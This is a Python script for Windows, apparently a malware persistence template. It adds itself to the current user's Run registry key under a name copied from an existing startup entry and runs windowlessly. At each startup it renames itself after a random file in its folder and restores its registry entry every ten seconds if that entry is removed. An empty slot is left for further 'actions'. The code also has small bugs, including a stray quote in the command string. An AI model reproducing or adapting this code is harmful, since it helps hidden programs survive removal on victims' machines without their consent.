import os
import winreg
import random
import time
import sys

def insertRunValue(sScriptPath, sValueName):
    sRegistryKey = winreg.HKEY_CURRENT_USER
    sRunPath = r"Software\Microsoft\Windows\CurrentVersion\Run"
    xPythonExecutable = sys.executable.replace('python.exe', 'pythonw.exe')
    sCommand = f'"{xPythonExecutable}" "{sScriptPath}" --startup"'
    
    with winreg.OpenKey(sRegistryKey, sRunPath, 0, winreg.KEY_ALL_ACCESS) as key:
        winreg.SetValueEx(key, sValueName, 0, winreg.REG_SZ, sCommand)

def getRunValues(sExcludedValueName=None):
    sRegistryKey = winreg.HKEY_CURRENT_USER
    sRunPath = r"Software\Microsoft\Windows\CurrentVersion\Run"
    sStartupValueNames = {}
    
    with winreg.OpenKey(sRegistryKey, sRunPath, 0, winreg.KEY_READ) as key:
        i = 0
        while True:
            try:
                sName, sValue, _ = winreg.EnumValue(key, i)
                if sName != sExcludedValueName:
                    sStartupValueNames[sName] = sValue
                i += 1 
            except OSError:
                break
                
    return sStartupValueNames

def makeScriptName(sScriptPath, sExcludedFileName):
    sDirectory = os.path.dirname(sScriptPath)
    sExistingScriptNames = [f for f in os.listdir(sDirectory) if os.path.isfile(os.path.join(sDirectory, f)) and f != sExcludedFileName]
    
    if not sExistingScriptNames:
        sName, sExtension = os.path.splitext(sExcludedFileName)
        return f"{sName}.{sExtension}"
        
    sSelectedFileName = random.choice(sExistingScriptNames)
    sName, sExtension = os.path.splitext(sSelectedFileName)
    
    return f"{sName}.{sExtension}"

def renameScript(sScriptPath):
    sNewScriptName = makeScriptName(sScriptPath, os.path.basename(sScriptPath))
    sNewScriptPath = os.path.join(os.path.dirname(sScriptPath), sNewScriptName)
    
    os.rename(sScriptPath, sNewScriptPath)

    return sNewScriptPath

def updateRunValue(file_path, app_name):
    insertRunValue(file_path, app_name)

def makeValueName(sStartupValueNames):
    if sStartupValueNames:
        return f"{random.choice(list(sStartupValueNames.keys()))}..."
    else:
        return "default"

def getCurrentValueName(sScriptPath):
    sRegistryKey = winreg.HKEY_CURRENT_USER
    sRunPath = r"Software\Microsoft\Windows\CurrentVersion\Run"
    xPythonExecutable = sys.executable.replace('python.exe', 'pythonw.exe')
    sCommand = f'"{xPythonExecutable}" "{sScriptPath}" --startup"'
    
    with winreg.OpenKey(sRegistryKey, sRunPath, 0, winreg.KEY_READ) as key:
        i = 0
        while True:
            try:
                sName, sValue, _ = winreg.EnumValue(key, i)
                if sValue == sCommand:
                    return sName
                i += 1
            except OSError:
                break
                
    return None

def monitorRunKey(sScriptPath, sValueName):
    sRegistryKey = winreg.HKEY_CURRENT_USER
    sRunPath = r"Software\Microsoft\Windows\CurrentVersion\Run"
    xPythonExecutable = sys.executable.replace('python.exe', 'pythonw.exe')
    sCommand = f'"{xPythonExecutable}" "{sScriptPath}" --startup"'
    
    try:
        with winreg.OpenKey(sRegistryKey, sRunPath, 0, winreg.KEY_ALL_ACCESS) as key:
            try:
                sValue = winreg.QueryValueEx(key, sValueName)[0]
                if sValue != sCommand:
                    winreg.SetValueEx(key, sValueName, 0, winreg.REG_SZ, sCommand)
            except FileNotFoundError:
                winreg.SetValueEx(key, sValueName, 0, winreg.REG_SZ, sCommand)
    except Exception as e:
        print(f"Error monitoring for value: {e}")

def main():
    sScriptPath = os.path.abspath(__file__)
    
    if "--startup" in sys.argv:
        # Renaming script
        sValueName = getCurrentValueName(sScriptPath)
        sUpdatedScriptPath = renameScript(sScriptPath)
        
        updateRunValue(sUpdatedScriptPath, sValueName)
        
        # Main loop, startup action goes here
        # (For limited repetitions of actions, 
        # add an iteration variable to be used as
        # a comparator to a repetition condition)
        while True:
            # Monitoring for value goes here:
            monitorRunKey(sUpdatedScriptPath, sValueName)
            time.sleep(10)
            
            # Actions go here:
        
    else:
        # First execution, insertion to startup
        sStartupValueNames = getRunValues()
        sValueName = makeValueName(sStartupValueNames)
        if not sStartupValueNames:
            sValueName = "default"
        
        insertRunValue(sScriptPath, sValueName)

if __name__ == "__main__":
    main()
